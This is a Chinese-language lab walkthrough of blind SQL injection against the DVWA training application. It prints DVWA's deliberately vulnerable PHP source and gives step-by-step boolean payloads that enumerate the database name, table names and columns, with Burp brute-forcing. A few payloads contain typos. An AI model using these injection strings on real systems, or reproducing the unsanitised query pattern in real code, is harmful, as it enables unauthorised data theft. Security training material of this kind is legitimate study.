# SQL盲注
## 漏洞描述
与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。
## 手工盲注过程
1. 判断是否存在注入，注入是字符型还是数字型
2. 猜解当前数据库名
3. 猜解数据库中的表名
4. 猜解表中的字段名
5. 猜解数据
#
手工盲注就相当于你再询问一个人问题，而这个人只会说是或者不是，因此在询问的过程中这样询问，数据库名字的第一字母是不是a？通过这种询问从而一点一点将数据库的名字获取。
## 漏洞利用
## Low SQL Injection (Blind) Source
```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?> 
```
从代码中可看出结果只会显示存在或者不存在。
- 存在
![image](https://user-images.githubusercontent.com/71583369/144703086-ac33bad2-f36b-4952-b5a5-617fd5db3c46.png)
- 不存在
![image](https://user-images.githubusercontent.com/71583369/144703097-03877ec4-8711-4232-9f83-d60574754638.png)
1. 判断是否存在注入，判断是字符型还是数字型注入
- 输入`1' and 1=1#`显示存在，输入`1' and 1=2#`显示不存在，判断为字符型注入
2. 猜解数据库名字，使用`length()`判断长度，构造`1' and length(database())=4#`,在不知道长度的情况下可以使用burp进行爆破
- 抓取数据包发送到爆破模块，长度的位置添加变量
![image](https://user-images.githubusercontent.com/71583369/144705355-8a77e260-3246-4cab-8efd-bfadc7290919.png)
- 查看爆破结果，数据库长度为4
![image](https://user-images.githubusercontent.com/71583369/144705266-dd7641f9-354e-44cd-99ce-ac0df26dcc60.png)
- 判断数据库名的第一个字母，构造`1' and ascii(substr(databse(),1,1))＝100 #`使用ascii值进行判断，然后再对照ascii表判断对应的字母
- 函数用法：`substr(string string,num start,num length);`
- `大写字母A~Z对应的ASCII码（十进制）为“65”~“90”`
- `小写字母a~z对应的百ASCII码（十进制）为"97"~“122”`
#
- 这里可以看住最小的值为65，最大值为122，我们构造一个数字的字典从65到122。
![image](https://user-images.githubusercontent.com/71583369/144706626-10208ad6-4e9a-4e31-ad12-0a029b34b978.png)
- 可以看到100的时候与其他的长度不一样，100对应的是d，可以判断第一个字母为d
![image](https://user-images.githubusercontent.com/71583369/144706481-9b7ea7d5-6d98-432a-a19c-f32ff2c362fc.png)
- 判断第二字符，只需要修改为`1' and ascii(substr(database(),2,1))＝100 #`即可，后面的以此类推，分别取不同的位置，爆出数据库名为dvwa。
3. 猜解表名
- 判断数据库中有几个表，构造`1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 #`
![image](https://user-images.githubusercontent.com/71583369/144706910-7bc6433e-9cb5-468e-afe0-53e646de0980.png)
#
- 说明有两张表，判断第一张表的长度`1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # `
![image](https://user-images.githubusercontent.com/71583369/144707338-e8f14150-899f-4592-a07f-3e59f783f26c.png)
#
- 说明长度为9
- 判断第一个字母，构造`1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))＝103 #`
![image](https://user-images.githubusercontent.com/71583369/144707480-8ba0e7d5-56e9-49f0-b9da-585a00ab6548.png)
#
- 判断第一个字母为g，以此类推，第一个表为guestbook
- 判断第二张表长度，构造`1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2))=5 #`
- 判断第一个字母，构造`1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #`
- 第二张表名为users
4. 猜字段名
- 猜字段数`1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # `,为8个字段
![image](https://user-images.githubusercontent.com/71583369/144708090-e719b6b7-b8e4-483f-a95d-ad763e08003c.png)
- 第一个字段长度`1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7 #`
![image](https://user-images.githubusercontent.com/71583369/144708264-f649c9ef-7eac-4eae-9986-aa954362bc78.png)
#
长度为7,后续不再演示。
## 参考链接
https://www.cnblogs.com/karentec/articles/10621633.html

















